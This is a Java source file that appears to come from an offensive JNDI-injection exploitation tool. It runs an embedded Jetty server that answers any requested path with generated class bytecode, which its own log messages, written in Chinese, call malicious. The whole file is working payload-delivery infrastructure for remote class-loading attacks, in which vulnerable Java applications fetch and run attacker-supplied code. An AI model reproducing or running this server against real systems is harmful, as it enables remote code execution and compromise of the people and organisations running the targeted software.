package org.su18.server;

import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHandler;
import org.su18.asm.frame.Frame;
import org.su18.utils.Logger;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URLEncoder;


public class JettyServer implements Runnable {

	private Server server;

	public JettyServer(int port) {
		server = new Server(port);
	}

	@Override
	public void run() {
		ServletHandler handler = new ServletHandler();
		server.setHandler(handler);

		// 添加访问路由映射
		handler.addServletWithMapping(DownloadServlet.class, "/*");
		try {
			server.start();
			server.join();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	@SuppressWarnings("serial")
	public static class DownloadServlet extends HttpServlet {

		public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

			// 获取 request 对象传入的文件名
			String filename = request.getRequestURI().substring(1).replace(".class", "");

			ByteArrayInputStream bain      = null;


			try {
				// 根据请求的不同 URL 进行不同类型的编制
				byte[] transformed = Frame.generate(filename);

				bain = new ByteArrayInputStream(transformed);

			} catch (Exception e) {
				e.printStackTrace();
				Logger.error(" JETTY 服务器 >> 恶意 class 字节码编织失败");
			}

			Logger.info(" JETTY 服务器 >> 接收访问： " + request.getRequestURL());
			response.setStatus(HttpServletResponse.SC_OK);
			response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(filename, "UTF-8"));

			int          len;
			byte[]       buffer = new byte[1024];
			OutputStream out    = response.getOutputStream();
			if (bain != null) {
				while ((len = bain.read(buffer)) > 0) {
					out.write(buffer, 0, len);
				}
				bain.close();
				Logger.info(" JETTY 服务器 >> 已经返回恶意字节码");

			} else {
				Logger.error(" JETTY 服务器 >> 读取文件失败！");
			}
		}

		public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			doGet(request, response);
		}
	}
}
